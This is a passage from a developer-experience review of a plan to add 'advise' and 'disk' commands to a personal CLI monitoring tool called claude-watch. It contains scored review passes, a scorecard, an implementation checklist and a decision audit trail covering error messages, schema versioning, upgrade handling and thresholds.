it correctly sequences itself last because `skills/*` are symlinked and go live on
write (HANDOFF §12). Three gaps.

**DX-12 (MEDIUM) — the CPU caveat points a user at a maintainer document.** §5
mandates `cpu ok (CPU time only; GPU/ANE power is not measured — see HANDOFF §7c)`
on every CPU summary. HANDOFF is a decisions log for whoever maintains this; the
user-facing statement of the same limitation already exists at README:248-252.

*Fix — decided:* the on-screen caveat points at README's Limitations. HANDOFF §7c
stays as the maintainer's reference and README links to it. One fact, two audiences,
correct door for each.

**DX-10 (MEDIUM) — `doctor` never learns the new surface.** §6 U2 argues, correctly,
that `advise` should exit 0 on a full disk because "`doctor` is the health gate" —
and then U7 adds nothing to `doctor`. The health gate does not know this feature
exists.

*Fix — decided:* two `chk` lines in the existing `doctor()` block
(`claude-watch:1337`), owned by U4 alongside the `install.sh` change:
`disk scanner is executable` and `disk cache present and writable (age 3h)`.

**DX-16** (exit-code table, above) also lands in this pass.

### Pass 5 — Upgrade Path (Credible): 5/10 → 8/10 after fixes

G3 is a backward-incompatible analysis change on a tool whose data is the product.
The plan handles it honestly at the schema level — `cpu_basis`, per-kind `NF`
detection, "historical data stays estimate-based" — and then tells the user almost
nothing.

**DX-8 (HIGH) — `"mixed"` is one word for the only question an upgrading user
asks.** Which of my numbers changed, and since when? §3d gives `cpu_basis ∈ cputime
| estimate | mixed` and §1 U1 says the two eras "are not directly comparable". A
`--window month` run today returns `mixed` and no boundary.

*Fix — decided:* add `"cpu_basis_since": <epoch|null>` to the JSON (the oldest
cputime-era sample in the window), and print the boundary in the human header:
`cpu basis: mixed (measured CPU time since 2026-08-07; earlier rows are %cpu
estimates and are not directly comparable)`. One README paragraph under a new "Data
format changes" heading, dated, saying the same thing once for people who never run
`--json`.

**DX-7 (HIGH) — the upgrade leaves a non-executable dependency.** `install.sh:20`
chmods `claude-watch`, `claude-top`, `tools/sample.sh`; U4 adds `tools/disk-scan.sh`
to that line. But the CLI is a symlink into the clone (`install.sh:18`) and the
skills are symlinks too (`install.sh:44`), so a `git pull` makes `advise` and `disk`
live *immediately* while `disk-scan.sh` may not be executable — and nothing prompts
a re-run of `install.sh`.

*Fix — decided (mechanical):* invoke it as `bash "$REPO_DIR/tools/disk-scan.sh"`,
never `"$REPO_DIR/tools/disk-scan.sh"`. Keep the `install.sh` chmod as well; belt and
braces costs one word and removes the failure class entirely.

**DX-15 (MEDIUM) — no schema version on a contract that just proved it changes.**
Era detection is a field count per row kind. It works today; it silently mis-detects
the day anything else appends a field, and `cpu_basis` would then lie rather than
fail. The skill is symlinked, so a schema change reaches the model with no
deployment step at all.

*Fix — decided:* `"schema": 1` in `advise --json` and `disk --json` (new commands
only — do not retrofit `report`/`orphans`/`worktrees`/`status`, which have shipped
without one and gain nothing). SKILL.md says: if `schema` is absent or greater than
the one you know, report the raw fields and do not interpret.

No CHANGELOG.md exists in this repo. For a single-user tool that is defensible, and
the dated README paragraph above covers the one change that actually needs an
announcement. Not adding one.

### Pass 6 — Developer Environment & Tooling (Valuable + Accessible): 6/10 → 8/10

Strong foundations: `--json` is non-interactive by construction, `NO_COLOR` is
honoured through the existing gate, every unit ships its own
`tests/fixture-<unit>.sh` and U2 wires a fixture loop into `smoke.sh`, and both
`disk-scan.sh` and every analyzer are written so a fixture can drive them against a
synthetic tree or a hand-written cache with no real disk involved. That is better
test ergonomics than the product has today, where README:238-246 admits fixture
coverage is the outstanding gap.

The environment gap is **DX-1** (Pass 1): a 120s blocking scan is a broken tool in
any non-interactive context, and the skill's `allowed-tools` grant
(`Bash(claude-watch advise*)`, U7) pre-approves it with no prompt to slow it down.
The `[ -t 1 ]` split fixes CI, `smoke.sh` and the agent path in one stroke.

One more: **`smoke.sh` must assert the new refusals and the non-tty path.**
`tests/smoke.sh:45-60` already skips `status`/`doctor` on a fresh checkout because
they legitimately fail there — `advise` needs the same treatment, plus assertions
that `advise --no-scan` never scans and that `advise --window bogus` exits 2 with a
message naming `24h`. U2 owns it.

### Pass 7 — Community & Ecosystem (Findable + Desirable): 6/10, no change needed

Examined: LICENSE (MIT), the public GitHub remote, README's install and uninstall
sections, the absence of CONTRIBUTING.md and issue templates, and the two published
skills as the extension surface. Nothing flagged. This is a personal tool with one
user and one contributor; adding community scaffolding would be scope this plan
never asked for, and the README already does the one job that matters for a reader
who finds the repo — it explains the problem before the solution and shows real
output. The only community-adjacent requirement is already in U7: anonymise the
absolute `~/Dev` and `~/Downloads` paths that `advise --json` embeds before any
example is published.

### Pass 8 — DX Measurement & Feedback Loops: 5/10 → 7/10

§8 open decision 9 (`$DATA/state/advise.log`, one line per run, so the render can
say "unchanged since 3 days ago") is the right instinct and the only feedback loop
in the plan. **Auto-decided: yes, minimal version** — epoch, window, per-domain
severity, top finding id per domain, one line, appended. It is what turns a tool
that nags identically forever into one that can tell you nothing has changed, and
`$DATA/state/` already caches so it breaks no invariant. Closing §8 open decision 9.

Beyond that there is no way to know whether advice was acted on, and for a
single-user tool there does not need to be — the "unchanged since N days" line *is*
the measurement. Not adding instrumentation.

What can be measured after shipping, and should be: **TTHW** (below) is checkable
with a stopwatch on a scratch `CLAUDE_WATCH_HOME`, and the U0 timing fixture
(≤5s for 60k rows) is the first performance assertion this repo has ever had.

---

## D4. TTHW assessment

"Hello world" = clone → `./install.sh` → `claude-watch advise` prints a finding the
user can act on.

| | Time | Notes |
|---|---|---|
| Install (measured shape) | ~20s | `git clone`, `./install.sh`; symlinks + launchd load |
| First `advise`, **plan as written** | 10-120s of silence, then a partly-`unknown` report | cold scan blocks; cpu/memory `unknown` with no explanation; worst domain prints third |
| **Current tier** | **Needs Work (5-10 min effective)** | not because the clock says so, but because the first run is abandoned and retried |
| First `advise`, **after DX-1 + DX-19 + DX-6** | ~1s to a real disk or leaks finding | disk and leaks are measurable at T+0; only cpu/memory need history, and they say so |
| **Target** | **< 2 min end to end (Champion tier)** | achievable with no new subsystem — it is the same output, ordered and captioned honestly |

The target is realistic precisely because two of the four domains need no sampler
history. A fresh install can produce a true, actionable disk finding one second
after `install.sh` returns. The plan as written hides that behind a hang.

---

## D5. DX Scorecard

```
+====================================================================+
|              DX PLAN REVIEW — SCORECARD                            |
+====================================================================+
| Dimension            | Score  | Prior  | Trend  |
|----------------------|--------|--------|--------|
| Getting Started      |  5/10  |   —    |  new   |
| API/CLI/SDK          |  6/10  |   —    |  new   |
| Error Messages       |  4/10  |   —    |  new   |
| Documentation        |  7/10  |   —    |  new   |
| Upgrade Path         |  5/10  |   —    |  new   |
| Dev Environment      |  6/10  |   —    |  new   |
| Community            |  6/10  |   —    |  new   |
| DX Measurement       |  5/10  |   —    |  new   |
+--------------------------------------------------------------------+
| TTHW                 | Needs Work -> target < 2 min (Champion)     |
| Competitive Rank     | Needs Work (as written) / Champion (fixed)  |
| Magical Moment       | designed: "first run names 30G you can get  |
|                      | back, one second after install"             |
| Product Type         | CLI tool + Claude Code skill                |
| Mode                 | POLISH                                       |
| Overall DX           |  5.5/10 as written -> 8/10 with the P1 list |
+====================================================================+
| DX PRINCIPLE COVERAGE                                              |
| Zero Friction                | gap  (DX-1 blocking first run)      |
| Learn by Doing               | covered (README shows real frames)   |
| Fight Uncertainty            | gap  (DX-2 no error strings)         |
| Opinionated + Escape Hatches | gap  (no --no-scan; thresholds are   |
|                              | constants, not knobs)                |
| Code in Context              | covered (actions are real commands,  |
|                              | gated on confidence: confirmed)      |
| Magical Moments              | gap  (buried behind the cold scan)   |
+====================================================================+
```

**Threshold table (§5) — comprehensible and tunable?** Comprehensible: yes, and it
is the best-written section in the plan. Every row carries a live check against a
real number from this machine (`airportd` 0.13 cores → info; 19.8Gi avail = 4.7% →
critical on both tests), the denominator is stated once in §3c and never restated,
and §5 explicitly flags the one number it does not trust (CPU 0.25). Tunable: **no.**
Constants at the top of four analyzer files are the only configuration in this
product that is not a `CLAUDE_WATCH_*` env var.

**DX-9 (MEDIUM) — fix, decided.** Two parts, and the first matters more than the
second:

1. **Every human finding prints the threshold that fired**, alongside the value the
   JSON already carries: `chrome-headless-shell  1.4 cores sustained  (warn at 0.25)`.
   The table becomes self-documenting at the point of use, and a user who disagrees
   knows exactly which number they are arguing with. Cheap — `value`, `threshold` and
   `unit` are already in the §3b row.
2. **Two env overrides only**, for the two numbers §8 open decision 1 itself calls
   contentious: `CLAUDE_WATCH_CPU_WARN_CORES` (default `0.25`) and
   `CLAUDE_WATCH_DISK_CRIT_PCT` (default `10`). Fourteen env vars for fourteen
   thresholds is a configuration surface nobody asked for; two knobs on the two
   contested numbers is the pragmatic middle, and they join the `usage()` block and
   the README table like every other knob.

On §8 open decision 1's substance: **0.35, not 0.25**, for CPU sustained warn. The
plan's own reasoning is decisive — a Claude session averaging 0.25 cores over 24h
trips it on its ordinary baseline, and a warning that fires every ordinary day is a
warning nobody reads. Disk `<10% or <25GiB` stands.

---

## D6. DX Implementation Checklist

```
DX IMPLEMENTATION CHECKLIST
============================
GETTING STARTED
[ ] Cold disk scan gated on [ -t 1 ]; --no-scan and --refresh both exist   (DX-1, U2)
[ ] Cold-scan notice prints BEFORE the scan, on stderr, never on --json    (DX-1, U2)
[ ] Fresh install: cpu/memory unknown says "sampler started Nm ago"        (DX-19, U2)
[ ] First run reaches a real finding in < 2 min end to end (stopwatch it)  (TTHW)

CLI DESIGN
[ ] User-facing env var is CLAUDE_WATCH_DISK_CACHE; CW_* is internal only  (DX-4, U2/U4/U5)
[ ] disk --json emits the same domain object advise does, "command":"disk" (DX-5, U2)
[ ] --window accepts Nw as well as Nh/Nd; week/month kept as aliases       (DX-17, U2)
[ ] Exit-code table in README + one line in usage()                        (DX-16, U7)

ERROR MESSAGES
[ ] All six strings from Pass 3 implemented verbatim (problem+cause+fix)   (DX-2, U2/U5)
[ ] Every one suppressed on the --json path                                (DX-2, U2)
[ ] remedy string on every domain with severity "unknown"                  (DX-13, U2)
[ ] partial_reason on every domain with partial: true                      (DX-14, U2/U5)
[ ] Severity colour map fixed; severity word always printed regardless     (DX-11, U2)
[ ] unknown never renders in C_OK                                          (DX-11, U2)

AGENT CONTRACT
[ ] One ordering rule (severity_rank, then cpu>memory>disk>leaks) used by
    the headline, the human sections AND the JSON domains array            (DX-3/DX-6, U2)
[ ] Explicit "priority": 1..4 integer on each domain                       (DX-3, U2)
[ ] measured == (severity != "unknown") asserted by a fixture              (DX-3, U2)
[ ] "schema": 1 on advise and disk JSON only                               (DX-15, U2)
[ ] SKILL.md: relay remedy verbatim; pass --no-scan; stop on unknown schema (DX-13/15, U7)

HUMAN OUTPUT
[ ] Worst domain's section prints first                                    (DX-6, U2)
[ ] ok domains collapse to one line                                        (DX-18, U2)
[ ] Every finding shows the threshold that fired                           (DX-9, U2)
[ ] GPU/ANE caveat points at README Limitations, not HANDOFF §7c           (DX-12, U2/U7)

UPGRADE
[ ] cpu_basis_since in JSON + era boundary date in the human header        (DX-8, U2/U3)
[ ] Dated "Data format changes" paragraph in README                        (DX-8, U7)
[ ] disk-scan.sh invoked as `bash "$REPO_DIR/tools/disk-scan.sh"`          (DX-7, U2)
[ ] install.sh chmod line still updated (belt and braces)                  (DX-7, U4)
[ ] doctor gains: scanner executable, cache present and writable + age     (DX-10, U4)

MEASUREMENT
[ ] $DATA/state/advise.log written; render says "unchanged since N days"   (§8 D9, U2)
[ ] smoke.sh: advise --no-scan never scans; --window bogus exits 2         (U2)
```

**P1 (ship blockers): DX-1, DX-2, DX-3.** Everything else lands in the same branch
or, for DX-9's env overrides and §8 D9's log, in U2 as written.

---

## D7. Decision audit trail

| # | Decision | Kind | Chosen | Alternative | Downstream impact |
|---|---|---|---|---|---|
| 1 | Cold-scan behaviour on a missing cache | **taste** | Gate on `[ -t 1 ]`: scan for a human, `unknown` + `remedy` for anything else; `--refresh`/`--no-scan` override both ways | Always scan (plan as written); never scan | U2 gains one branch and one flag. The agent path stops being able to burn 120s of a turn. A non-tty user must run `disk --refresh` once |
| 2 | Six error strings written into the plan | mechanical | Verbatim table in Pass 3, problem+cause+fix, suppressed on `--json` | Leave wording to U2 at implementation time | U2 and U5 stop inventing prose; the strings become fixture-assertable; matches `claude-watch:1287`'s house style |
| 3 | Domain ordering | **taste** | ONE rule — `(severity_rank, then cpu>memory>disk>leaks)` — applied to the headline, the human sections and the JSON array, plus an explicit `priority` int | Fixed order in both (plan as written); fixed human / sorted JSON | Resolves the §3d-vs-§4 contradiction and the SKILL.md "never re-rank" conflict in one change. Human sections stop being positionally stable, which is the cost; the headline already told them what moved |
| 4 | `advise` vs `advice` vs `triage` (§8 D6) | **taste** | `advise` | `advice` is the more consistent noun | Closes §8 D6. No edits anywhere; consistency argument loses to churn cost on a coin flip |
| 5 | `CW_DISK_CACHE` naming | mechanical | `CLAUDE_WATCH_DISK_CACHE` user-facing; `CW_*` internal-only, stated once | Keep `CW_` for everything | Touches §3c, §3b, U4, U5, `usage()`, README table |
| 6 | `disk --json` schema | mechanical | Same domain object as `advise`, `"command":"disk"` | Bespoke shape; or no `--json` on `disk` | One fixture covers both; `SKILL.md:16`'s "the JSON is the contract" survives |
| 7 | Threshold tunability | **taste** | Print the threshold in every finding + exactly two env overrides on the two contested numbers | 14 env vars; or constants only (plan as written) | Two rows in the README table; the printed threshold does most of the work |
| 8 | CPU sustained warn value (§8 D1) | **taste** | `0.35` | `0.25` (plan as written) | Closes half of §8 D1. Stops a warn on every ordinary Claude day; a genuinely busy session still trips it |
| 9 | `advise.log` (§8 D9) | mechanical | Yes, minimal: epoch, window, per-domain severity, top finding id | Stateless (nags identically forever) | Closes §8 D9. One append per run into `$DATA/state/`, which already caches |
| 10 | `schema` version field | mechanical | `"schema": 1` on `advise`/`disk` only | Retrofit every command; or none | New commands only; SKILL.md gains an unknown-schema stop rule |
| 11 | `remedy` + `partial_reason` fields | mechanical | Both, one string each | Leave the explanation to SKILL.md prose | Moves the last piece of severity judgement out of the model and into bash, which is this feature's founding argument |
| 12 | `disk-scan.sh` invocation | mechanical | `bash "$path"`, plus keep the `install.sh` chmod | chmod alone | Removes the `git pull` upgrade hole entirely |
| 13 | GPU/ANE caveat target | mechanical | README Limitations (README:248) | HANDOFF §7c (plan as written) | User-facing text points at a user-facing doc |
| 14 | `--window` accepted forms | mechanical | Add `Nw`; keep `week`/`month`; error names every form | `Nh`/`Nd` + words only | Three characters in the parser, one line in the error |
| 15 | CHANGELOG.md | mechanical | No — a dated "Data format changes" paragraph in README instead | Add CHANGELOG.md | One user, one changed format; a whole file for one entry is scaffolding |
| 16 | Community scaffolding (CONTRIBUTING, templates) | mechanical | No | Add them | Out of scope; nothing in this plan touches it |

**Totals: 16 decisions — 11 mechanical, 5 taste.**

---

## D8. NOT in scope (considered, deliberately deferred)

- **`status` reporting disk-cache age.** One-stop health is appealing, but `status`
  is documented as "is sampling alive" and widening it invites the next widening.
  `doctor` gets the check instead (DX-10).
- **`advise --thresholds` to dump the table.** Printing the threshold in every
  finding (DX-9) delivers the same information where the user actually is, with no
  new command.
- **A `--domain cpu` filter.** §1 already declined it; nothing in this review changes
  that. `--json` plus `jq` covers the one user who wants it.
- **Retrofitting `"schema"` onto `report`/`orphans`/`worktrees`/`status`.** They
  shipped without one and their shapes are not changing here.
- **CHANGELOG.md and community scaffolding.** See decisions 15 and 16.
- **Measuring whether advice was acted on** beyond the "unchanged since N days"
  line. For one user, that line is the measurement.

---

## D9. What already exists (reuse, do not re-invent)

- `[ -t 1 ] && [ -z "${NO_COLOR:-}" ]` colour gate — `claude-watch:57-63`. DX-1's
  scan decision reuses the same test rather than inventing a `--interactive` flag.
- `is_uint()` — `claude-watch:434`, and the `--min`/`--days` validation shape at
  `:745-752` / `:1097-1104`. `--window` validation follows it, exit 2 included.
- The one error message in the codebase that gets problem+cause+fix right —
  `claude-watch:1287`. Pass 3's six strings are written in its voice.
- `chk()` inside `doctor()` — `claude-watch:1337`. DX-10's two checks are two more
  `chk` lines, not a new mechanism.
- `JESC_AWK` — `claude-watch:88`, already the shared-string pattern §8 D2 discusses.
- `tmp_cleanup` trap — `claude-watch:438`, cited by §9 and reused by U4.
- The skip-on-fresh-checkout pattern in `tests/smoke.sh:45-60`. `advise` needs it too.
- README's structure — problem, real output frame, then flags (README:9-52). U7's
  `advise` section should follow it rather than opening with a flag list.
